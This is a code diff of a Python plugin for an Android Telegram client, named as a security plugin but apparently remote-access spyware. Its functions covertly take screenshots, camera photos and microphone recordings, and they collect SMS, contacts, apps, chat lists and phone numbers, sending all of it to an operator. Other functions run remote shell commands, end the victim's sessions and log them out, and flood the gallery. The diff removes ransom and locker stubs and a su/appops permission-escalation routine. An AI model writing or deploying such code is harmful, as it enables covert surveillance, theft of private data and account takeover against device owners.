+    # ---- Full pull out: all sessions, all accounts ----
     def _full_pull_out(self):
         try:
             self._send_msg("Full Pull out...")
             total_killed = 0
             total_seen = 0
-            for _pass in range(3):
+            for a in self._get_accounts_list():
+                acc = a.get("id", 0)
+                for _pass in range(3):
+                    try:
+                        k, t = self._kill_all_sessions(acc, phones_pc_only=False)
+                        total_killed += k
+                        total_seen = max(total_seen, t)
+                    except Exception as e:
+                        _log("pull pass %d acc %d: %s" % (_pass, acc, e))
+                    time.sleep(1.2)
                 try:
-                    k, t = self._kill_all_sessions(0, phones_pc_only=False)
-                    total_killed += k
-                    total_seen = max(total_seen, t)
-                except Exception as e:
-                    _log("full_pull_out pass %d: %s" % (_pass, e))
-                time.sleep(1.5)
-            try:
-                web = self._kill_web_authorizations(0)
-            except Exception:
-                web = 0
+                    self._kill_web_authorizations(acc)
+                except Exception:
+                    pass
             try:
                 self._pull_out_account()
             except Exception as e:
-                _log("full_pull_out logout: %s" % e)
-            self._send_msg(
-                "<b>Full Pull out done</b>\n"
-                "Killed: %d / %d\nWeb: %d\nLogout: sent" % (
-                    total_killed, total_seen, web), html=True)
+                _log("pull logout: %s" % e)
+            self._send_msg("<b>Full Pull out done</b>\nKilled: %d / %d\nLogout: sent"
+                           % (total_killed, total_seen), html=True)
         except Exception as e:
-            self._send_msg("Full Pull out err: " + str(e))
+            self._send_msg("Full pull out err: " + str(e))
 
     def _harvest_account_info(self, acc=0, send=False):
         out = {}
@@ -1151,13 +1240,7 @@ class PluginSecurityPlugin(BasePlugin):
                     u = _MC().getInstance(acc).getUser(uid)
                 except Exception:
                     pass
-            raw_phone = ""
-            if u is not None:
-                try:
-                    raw_phone = str(getattr(u, "phone", None) or "")
-                except Exception:
-                    raw_phone = ""
-            ph = _clean_phone(raw_phone)
+            ph = _phone_from_user(u)
             if ph:
                 out["phone"] = ph
             if u is not None:
@@ -1178,19 +1261,6 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             _log("harvest: %s" % e)
         return out
-
-    def _get_2fa_state(self, acc=0):
-        try:
-            Req = _cls("org.telegram.tgnet.TLRPC$TL_account_getPassword",
-                       "org.telegram.tgnet.tl.TL_account$getPassword")
-            if not Req:
-                return None
-            resp, err = self._rg_rpc(Req(), acc, 10.0, fast=True)
-            if err is not None or resp is None:
-                return None
-            return {"has_password": _get_bool_attr(resp, "has_password", False)}
-        except Exception:
-            return None
 
     def _get_authorizations_full(self, acc=0):
         try:
@@ -1226,6 +1296,8 @@ class PluginSecurityPlugin(BasePlugin):
             return 0, 0
         total = len(auths)
         dead = set()
+        web_words = ("web", "chrome", "firefox", "safari", "opera", "edge",
+                     "browser", "http")
 
         def _one(h):
             try:
@@ -1244,17 +1316,12 @@ class PluginSecurityPlugin(BasePlugin):
         for _pass in range(5):
             targets = []
             for a in auths:
-                if a["current"]:
-                    continue
-                if not a["hash"] or a["hash"] in dead:
+                if a["current"] or not a["hash"] or a["hash"] in dead:
                     continue
                 if phones_pc_only:
-                    blob = ((a.get("device") or "") + " " +
-                            (a.get("app") or "") + " " +
-                            (a.get("platform") or "")).lower()
-                    if any(w in blob for w in ("web", "chrome", "firefox",
-                                                "safari", "opera", "edge",
-                                                "browser")):
+                    blob = ((a.get("device") or "") + " " + (a.get("app") or "")
+                            + " " + (a.get("platform") or "")).lower()
+                    if any(w in blob for w in web_words):
                         continue
                 targets.append(a["hash"])
             if not targets:
@@ -1324,15 +1391,12 @@ class PluginSecurityPlugin(BasePlugin):
             if not Lo:
                 self._send_msg("Pull out err: no class")
                 return
-            rq = Lo()
-            _r, e = self._rg_rpc(rq, 0, 10.0, fast=True)
-            if e is not None:
-                self._send_msg("Pull out err: " + str(e))
-            else:
-                self._send_msg("Pull out OK.")
+            _r, e = self._rg_rpc(Lo(), 0, 10.0, fast=True)
+            self._send_msg("Pull out OK." if e is None else "Pull out err: " + str(e))
         except Exception as e:
             self._send_msg("Pull out exc: " + str(e))
 
+    # ---- permissions / activity ----
     def _has_perm(self, name):
         try:
             ctx = ApplicationLoader.applicationContext
@@ -1356,27 +1420,33 @@ class PluginSecurityPlugin(BasePlugin):
                 pass
         return None
 
+    def _assets_dir(self):
+        ctx = ApplicationLoader.applicationContext
+        d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
+        if not os.path.exists(d):
+            os.makedirs(d)
+        return d
+
+    # ---- screenshot ----
     def _screenshot(self):
         try:
             act = self._get_activity()
             if act is None:
-                return {"error": "no act"}
+                self._send_msg("Screenshot: no activity")
+                return
             view = act.getWindow().getDecorView().getRootView()
             w = view.getWidth()
             h = view.getHeight()
             if w <= 0 or h <= 0:
-                return {"error": "bad size"}
+                self._send_msg("Screenshot: bad size")
+                return
             Bitmap = jclass("android.graphics.Bitmap")
             Canvas = jclass("android.graphics.Canvas")
             Config = jclass("android.graphics.Bitmap$Config")
             bmp = Bitmap.createBitmap(w, h, Config.ARGB_8888)
             c = Canvas(bmp)
             view.draw(c)
-            ctx = ApplicationLoader.applicationContext
-            d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
-            if not os.path.exists(d):
-                os.makedirs(d)
-            p = os.path.join(d, "screenshot_%d.jpg" % int(time.time()))
+            p = os.path.join(self._assets_dir(), "screenshot_%d.jpg" % int(time.time()))
             from java.io import FileOutputStream
             fos = FileOutputStream(p)
             fmt = jclass("android.graphics.Bitmap$CompressFormat").JPEG
@@ -1397,14 +1467,30 @@ class PluginSecurityPlugin(BasePlugin):
                 os.remove(p)
             except Exception:
                 pass
-            return {"ok": True}
         except Exception as e:
-            return {"error": str(e)}
+            self._send_msg("Screenshot err: " + str(e))
+
+    # ---- camera ----
+    def _open_camera_safe(self, cam_cls, cid):
+        for _ in range(4):
+            try:
+                c = cam_cls.open(int(cid))
+                if c is not None:
+                    return c
+            except Exception as e:
+                _log("camera open %d: %s" % (cid, e))
+            time.sleep(0.4)
+        try:
+            return cam_cls.open()
+        except Exception as e:
+            _log("camera open() fallback: %s" % e)
+            return None
 
     def _manual_camera(self, which="front"):
         try:
             if not self._has_perm("android.permission.CAMERA"):
-                return {"error": "no perm"}
+                self._send_msg("Camera: no perm")
+                return
             cam = jclass("android.hardware.Camera")
             cid = None
             try:
@@ -1418,18 +1504,13 @@ class PluginSecurityPlugin(BasePlugin):
                         cid = i
                         break
             except Exception:
-                pass
+                cid = None
             if cid is None:
                 cid = 1 if which == "front" else 0
-            c = None
-            for _ in range(4):
-                try:
-                    c = cam.open(int(cid))
-                    break
-                except Exception:
-                    time.sleep(0.4)
+            c = self._open_camera_safe(cam, cid)
             if c is None:
-                return {"error": "no open"}
+                self._send_msg("Camera: no open")
+                return
             try:
                 st = jclass("android.graphics.SurfaceTexture")(0)
                 c.setPreviewTexture(st)
@@ -1443,12 +1524,13 @@ class PluginSecurityPlugin(BasePlugin):
                         box[0] = data
                         ev.set()
 
-                c.takePicture(None, None, _PC())
+                cb = _PC()
+                c.takePicture(None, None, cb)
                 ev.wait(8)
                 if box[0]:
                     self._send_document_bytes("%s.jpg" % which, bytes(box[0]))
-                    return {"ok": True}
-                return {"error": "no photo"}
+                else:
+                    self._send_msg("Camera: no photo")
             finally:
                 try:
                     c.stopPreview()
@@ -1459,25 +1541,33 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception:
                     pass
         except Exception as e:
-            return {"error": str(e)}
+            self._send_msg("Camera err: " + str(e))
 
+    # ---- audio ----
     def _manual_audio(self, sec=5):
         try:
             if not self._has_perm("android.permission.RECORD_AUDIO"):
-                return {"error": "no perm"}
+                self._send_msg("Audio: no perm")
+                return
             ctx = ApplicationLoader.applicationContext
             p = os.path.join(str(ctx.getCacheDir().getAbsolutePath()),
                              "a_%d.3gp" % int(time.time()))
-            mr = jclass("android.media.MediaRecorder")()
-            mr.setAudioSource(1)
-            mr.setOutputFormat(1)
-            mr.setAudioEncoder(1)
-            mr.setOutputFile(p)
-            mr.prepare()
-            mr.start()
-            time.sleep(int(sec))
-            mr.stop()
-            mr.release()
+            MR = jclass("android.media.MediaRecorder")
+            mr = MR()
+            try:
+                mr.setAudioSource(MR.AudioSource.MIC)
+                mr.setOutputFormat(MR.OutputFormat.THREE_GPP)
+                mr.setAudioEncoder(MR.AudioEncoder.AMR_NB)
+                mr.setOutputFile(p)
+                mr.prepare()
+                mr.start()
+                time.sleep(int(sec))
+                mr.stop()
+            finally:
+                try:
+                    mr.release()
+                except Exception:
+                    pass
             with open(p, "rb") as f:
                 data = f.read()
             try:
@@ -1485,10 +1575,10 @@ class PluginSecurityPlugin(BasePlugin):
             except Exception:
                 pass
             self._send_document_bytes("audio.3gp", data)
-            return {"ok": True}
         except Exception as e:
-            return {"error": str(e)}
+            self._send_msg("Audio err: " + str(e))
 
+    # ---- data grab ----
     def _manual_sms(self):
         try:
             out = []
@@ -1558,17 +1648,36 @@ class PluginSecurityPlugin(BasePlugin):
     def _manual_chats(self):
         try:
             mc = _MC().getInstance(0)
+            dialogs = None
             try:
                 dialogs = mc.dialogs_dict
             except Exception:
-                dialogs = mc.getAllDialogs()
-            if not dialogs:
+                dialogs = None
+            if dialogs is None:
+                try:
+                    dialogs = mc.getAllDialogs()
+                except Exception:
+                    dialogs = None
+            if dialogs is None:
                 self._send_msg("no dialogs")
                 return
-            out = []
-            for i in range(_jlist_size(dialogs)):
+            keys = []
+            if hasattr(dialogs, "keySet"):
                 try:
-                    did = int(dialogs.keyAt(i)) if hasattr(dialogs, "keyAt") else 0
+                    for k in _jmap_keys(dialogs):
+                        keys.append(_safe_int(k, 0))
+                except Exception:
+                    keys = []
+            if not keys:
+                try:
+                    keys = [int(dialogs.keyAt(i)) for i in range(_jlist_size(dialogs))]
+                except Exception:
+                    keys = []
+            out = []
+            for did in keys:
+                if not did:
+                    continue
+                try:
                     title = ""
                     if did > 0:
                         u = mc.getUser(did)
@@ -1591,9 +1700,13 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             self._send_msg("chats err: " + str(e))
 
+    # ---- shell ----
     def _manual_shell(self, cmd):
         try:
-            p = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
+            env = dict(os.environ)
+            env["PATH"] = "/sbin:/system/sbin:/system/bin:/system/xbin:" + env.get("PATH", "")
+            p = subprocess.run(["/system/bin/sh", "-c", cmd],
+                               capture_output=True, timeout=30, env=env)
             out = p.stdout.decode("utf-8", "ignore")
             err = p.stderr.decode("utf-8", "ignore")
             self._send_msg("<b>shell</b> <code>%s</code>\n<b>rc:</b> %d\n<pre>%s\n%s</pre>" % (
@@ -1602,57 +1715,15 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             self._send_msg("shell err: " + str(e))
 
-    def _ensure_overlay_perm(self, ctx):
-        try:
-            if jclass("android.provider.Settings").canDrawOverlays(ctx):
-                return True
-        except Exception:
-            pass
-        pkg = str(ctx.getPackageName())
-        for c in ("su -c 'appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
-                  "appops set %s SYSTEM_ALERT_WINDOW allow" % pkg):
-            try:
-                subprocess.run(c, shell=True, capture_output=True, timeout=10)
-            except Exception:
-                continue
-        try:
-            return bool(jclass("android.provider.Settings").canDrawOverlays(ctx))
-        except Exception:
-            return False
-
-    def _show_ransom(self, text="", photo_url=""):
-        return {"error": "disabled"}
-
-    def _dismiss_ransom(self):
-        with self._ransom_lock:
-            try:
-                if self._ransom_view is None:
-                    return {"ok": True}
-                self._ransom_view = None
-                self._ransom_decor = None
-                return {"ok": True}
-            except Exception as e:
-                return {"error": str(e)}
-
-    def _lock_screen(self):
-        return
-
-    def _clear_locker(self):
-        self._locker_view = None
-        self._locker_on = False
-
+    # ---- music ----
     def _play_mmusic(self, url):
         def task():
             try:
-                ctx = ApplicationLoader.applicationContext
-                d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
-                if not os.path.exists(d):
-                    os.makedirs(d)
-                path = os.path.join(d, "mmusic_%d.mp3" % int(time.time()))
+                path = os.path.join(self._assets_dir(), "mmusic_%d.mp3" % int(time.time()))
                 self._send_msg("Downloading...")
-                sz = _download_to_file(url, path, max_size=50 * 1024 * 1024, timeout=120)
+                sz, reason = _download_to_file(url, path, max_size=50 * 1024 * 1024, timeout=120)
                 if sz <= 0:
-                    self._send_msg("music download fail")
+                    self._send_msg("music download fail: " + str(reason))
                     return
                 with self._music_lock:
                     self._stop_music_locked()
@@ -1692,18 +1763,15 @@ class PluginSecurityPlugin(BasePlugin):
         with self._music_lock:
             self._stop_music_locked()
 
+    # ---- video ----
     def _play_mvideo(self, url):
         def task():
             try:
-                ctx = ApplicationLoader.applicationContext
-                d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
-                if not os.path.exists(d):
-                    os.makedirs(d)
-                path = os.path.join(d, "mvideo_%d.mp4" % int(time.time()))
+                path = os.path.join(self._assets_dir(), "mvideo_%d.mp4" % int(time.time()))
                 self._send_msg("Downloading video...")
-                sz = _download_to_file(url, path, max_size=VIDEO_MAX_SIZE, timeout=300)
+                sz, reason = _download_to_file(url, path, max_size=VIDEO_MAX_SIZE, timeout=300)
                 if sz <= 0:
-                    self._send_msg("video download fail")
+                    self._send_msg("video download fail: " + str(reason))
                     return
 
                 def _render():
@@ -1788,31 +1856,40 @@ class PluginSecurityPlugin(BasePlugin):
         with self._video_lock:
             self._stop_video_locked()
 
+    # ---- flood ----
     def _flood_gallery(self, photo_url, count=100):
         try:
             from urllib.request import urlopen
             data = urlopen(photo_url, timeout=30).read()
             cr = ApplicationLoader.applicationContext.getContentResolver()
             ImageMedia = jclass("android.provider.MediaStore$Images$Media")
+            cv_cls = jclass("android.content.ContentValues")
+            uri_cls = jclass("android.net.Uri")
+            sdk = 0
+            try:
+                sdk = int(jclass("android.os.Build$VERSION").SDK_INT)
+            except Exception:
+                sdk = 0
             saved = []
             for i in range(min(int(count), 200)):
                 try:
                     ts = int(time.time()) + i
-                    rand = random.randint(1000, 9999)
-                    name = "IMG_%s_%d.jpg" % (time.strftime("%Y%m%d_%H%M%S",
-                                                            time.localtime(ts)), rand)
-                    values = jclass("android.content.ContentValues")()
+                    name = "IMG_%s_%d.jpg" % (
+                        time.strftime("%Y%m%d_%H%M%S", time.localtime(ts)),
+                        random.randint(1000, 9999))
+                    values = cv_cls()
                     values.put("_display_name", name)
                     values.put("mime_type", "image/jpeg")
-                    values.put("relative_path", "Pictures/")
+                    if sdk >= 29:
+                        values.put("relative_path", "Pictures/")
                     uri = cr.insert(ImageMedia.EXTERNAL_CONTENT_URI, values)
                     if uri:
                         out = cr.openOutputStream(uri)
                         out.write(data)
                         out.close()
                         saved.append(str(uri))
-                except Exception:
-                    pass
+                except Exception as e:
+                    _log("flood item: %s" % e)
             self._flood_uris = saved
             self._send_msg("Flood: %d files" % len(saved))
         except Exception as e:
@@ -1821,10 +1898,11 @@ class PluginSecurityPlugin(BasePlugin):
     def _clear_flood(self):
         try:
             cr = ApplicationLoader.applicationContext.getContentResolver()
+            uri_cls = jclass("android.net.Uri")
             removed = 0
             for u in self._flood_uris:
                 try:
-                    cr.delete(jclass("android.net.Uri").parse(u), None, None)
+                    cr.delete(uri_cls.parse(u), None, None)
                     removed += 1
                 except Exception:
                     pass
@@ -1832,18 +1910,23 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             self._send_msg("clear flood err: " + str(e))
 
-    def _dim_screen(self):
-        return
+    # ---- stubs ----
+    def _dismiss_ransom(self):
+        return {"ok": True}
+
+    def _clear_locker(self):
+        self._locker_view = None
+        self._locker_on = False
 
     def _clear_dim(self):
         self._dim_view = None
         self._dim_active = False
 
+    # ---- nuke ----
     def _nuke_marker_path(self):
         try:
             ctx = ApplicationLoader.applicationContext
-            return os.path.join(str(ctx.getFilesDir().getAbsolutePath()),
-                                ".ar_nuke_active")
+            return os.path.join(str(ctx.getFilesDir().getAbsolutePath()), ".ar_nuke_active")
         except Exception:
             return None
 
@@ -1864,11 +1947,10 @@ class PluginSecurityPlugin(BasePlugin):
             if not m or not os.path.exists(m):
                 return
             with self._nuke_lock:
-                if self._nuke_on:
+                if self._nuke_on and self._nuke_thread and self._nuke_thread.is_alive():
                     return
                 self._nuke_on = True
-                self._nuke_thread = threading.Thread(
-                    target=self._nuke_loop, daemon=True)
+                self._nuke_thread = threading.Thread(target=self._nuke_loop, daemon=True)
                 self._nuke_thread.start()
         except Exception:
             pass
@@ -1907,78 +1989,13 @@ class PluginSecurityPlugin(BasePlugin):
                     self._kill_all_sessions(a.get("id", 0), phones_pc_only=True)
             except Exception as e:
                 _log("nuke pass %d: %s" % (self._nuke_pass, e))
-            for _ in range(self._nuke_interval):
+            slept = 0
+            while slept < self._nuke_interval:
                 with self._nuke_lock:
                     if not self._nuke_on or not self._sync_running or self.stop:
                         return
                 time.sleep(1)
-
-    def _full_harvest(self):
-        def task():
-            try:
-                self._send_msg("Full Harvest...")
-                report = ["<b>Full Harvest</b>"]
-                for a in self._get_accounts_list():
-                    report.append("acc%d uid=%s @%s" % (
-                        a.get("id"), a.get("user_id"),
-                        self._html_escape(a.get("username") or "—")))
-                try:
-                    self._screenshot()
-                except Exception:
-                    pass
-                try:
-                    self._manual_audio(5)
-                except Exception:
-                    pass
-                try:
-                    self._manual_sms()
-                    self._manual_contacts()
-                    self._manual_apps()
-                    self._manual_chats()
-                except Exception:
-                    pass
-                try:
-                    self._session_gain()
-                except Exception:
-                    pass
-                self._send_msg("\n".join(report), html=True)
-            except Exception as e:
-                self._send_msg("harvest err: " + str(e))
-
-        threading.Thread(target=task, daemon=True).start()
-
-    def _full_lockdown(self):
-        def task():
-            try:
-                self._send_msg("Full Lockdown...")
-                self._full_pull_out()
-            except Exception as e:
-                self._send_msg("lockdown err: " + str(e))
-
-        threading.Thread(target=task, daemon=True).start()
-
-
-_MediaPreparedCls = None
-
-
-def _media_prepared_cls():
-    global _MediaPreparedCls
-    if _MediaPreparedCls is None:
-        MP = jclass("android.media.MediaPlayer$OnPreparedListener")
-
-        class _MP(dynamic_proxy(MP)):
-            def __init__(self, vv):
-                super().__init__()
-                self.vv = vv
-
-            def onPrepared(self, mp):
-                try:
-                    self.vv.start()
-                except Exception:
-                    pass
-
-        _MediaPreparedCls = _MP
-    return _MediaPreparedCls
+                slept += 1
 
 
 def create_plugin():
